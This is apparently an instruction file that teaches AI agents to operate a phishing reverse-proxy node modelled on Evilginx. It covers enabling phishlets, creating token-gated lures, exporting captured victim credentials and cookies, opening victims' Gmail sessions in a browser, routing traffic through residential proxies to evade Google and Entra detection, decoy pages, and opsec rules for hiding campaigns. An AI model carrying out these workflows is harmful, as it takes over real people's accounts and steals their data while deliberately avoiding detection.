---
name: operating-fake-evilginx-pro
description: Operate the fake-evilginx-pro node (phishlets, lures, sessions, proxy, Google relay) via its MCP server or the raw mTLS API. Use when asked to enable/disable phishlets, create token-gated lures, inspect or export captured sessions, open a captured session in a real browser, configure upstream proxy routing, or troubleshoot the node (decoy pages, DNS, relay cooldowns).
---

# Operating fake-evilginx-pro (MCP + API)

Two control planes, same node: the **MCP server** (`tools/mcp/egmcp.py`, for AI agents)
and the **operator console** (`tools/egconsole.py`). Both speak the node's hidden mTLS
API (port 9443, stealth base path, client certs).

## Connection prerequisites

- Node list: `tools/my-servers.json` — `[{name, host, port, base, ca, cert, key}]`
  (cert/key paths relative to `tools/`). Client certs are secrets; they live only on
  the operator machine (`tools/api-certs-vps/`, gitignored).
- Google relay tools additionally need a `relay` block on the node entry:
  `"relay": {"host": "127.0.0.1", "port": 9445, "op_key": "<RELAY_OP_KEY>"}`
  plus an SSH tunnel from this machine:
  `ssh -i <key> -N -L 9445:127.0.0.1:9445 <user>@<node>`.
- MCP registration (ZCode / Claude Desktop / Claude Code):
  command `python`, args `["<repo>/tools/mcp/egmcp.py"]`; env optional
  `EG_MCP_DEFAULT_SERVER=<node-name>`. Deps: `pip install -r tools/mcp/requirements.txt`
  (+ `pip install playwright` for relay browser-open).

## Workflows (MCP tool names)

**Go-live checklist** — `phishlets_list` → `phishlet_enable <name>` →
`lure_create <name> redirect_url relay?` → `lure_url <id>` (**append `?t=<token>`
yourself — the token is a campaign secret**) → verify render via trusted loopback on
the node → `status`.

**Switch phishlets (zero impact, verified)** — `phishlet_disable google` → run the
ms365 campaign → `phishlet_enable google`. No restart; certs survive via hot-reload.
Never needed just to *use* one phishlet — disabling is exposure hygiene.

**Monitor & use captures** — `sessions_list` → `session_detail <id>` (credentials +
cookie sets) → `session_cookies <id>` (import-ready + gotchas) or
`session_export <id>` (Cookie-Editor JSON) or **`open_session <id>`** — opens a real
Chrome window on THIS machine signed in as the victim (detached; window outlives the
tool call). For Google relay captures: `relay_sessions` → `relay_capture <sid>` →
**`relay_open_session <sid>`** (opens the victim's Gmail).

**Proxy / egress** — `proxy_status` → `proxy_set address=… port=… routes=["google.com",
"gstatic.com"]` → `proxy_on`. Doctrine: Google egresses residential, ms365 stays
direct (Entra flags residential logins on work accounts). WARNING: echoing the masked
password back in `proxy_set` clobbers it — omit the field or send the real value.

**Changing source code** — edit `src/` or `tools/relay/` locally, then
`SSH_ID=<key> ./deploy/sync-node.sh` syncs → builds on the node → restarts both
services → heartbeats the API. Verify lures/sessions before handing over.
Architecture/module map: `docs/architecture.md`.

**Relay ops** — self-tests are **render-only** (fake submits burn the residential exit
for 30–60 min: "This browser or app may not be secure"). After bgrelay code updates,
restart the service (page.html loads into RAM at start).

## Raw API fallback (when MCP is unavailable)

```
https://<node>:9443<base>/status|/phishlets|/lures|/sessions|/proxy
POST  …/phishlets/{name}/enable|disable|hostname {"hostname": …}
POST  …/lures {"phishlet": …, "token": "auto", "relay": false}
GET   …/lures/{id}/url           POST/PUT/DELETE …/lures/{id}
POST  …/proxy {partial pointer fields}
```
mTLS with the client cert (`curl --cert client.crt --key client.key -k`). The base
path is printed at node boot and stored in `<cfgdir>/api/config.json`.

## Troubleshooting map

| Symptom | Verdict |
|---|---|
| 141-byte "It works!" page from curl | **Botguard decoy — by design** (UA/JA4 filtered). Render-test from the node via `--resolve <host>:443:127.0.0.1` + browser UA + cookie jar |
| Base host no A record while subdomains resolve | Wildcard `*.base` doesn't match `base` — create the bare A record; mind negative-cache TTL (≤1800 s) |
| Google "browser or app may not be secure" | Exit cooldown (wait/rotate) — or classic-MITM attempt (use the relay) — or datacenter IP (route via proxy) |
| Cross-redirects between phishlets | Duplicate `phish_sub` — make unique, reload |
| Pages reference a dead domain after migration | Stale `general.domain` — set it to the new base |
| Browser hangs, no error | SNI typo → silent drop |
| Relay page stale after deploy | bgrelay not restarted (page.html cached in RAM) |

## Opsec rules

- Hostnames / IPs / lure URLs / tokens stay out of public artifacts (repo, docs site).
- Campaign phishlets never leave the node. Detection checks only on burner domains.
- Close session windows (`open_session`/`relay_open_session`) when done — they are
  live victim sessions on the operator's desktop.
- Check `.worklog/` and memory at session start; log outcomes there as you go.
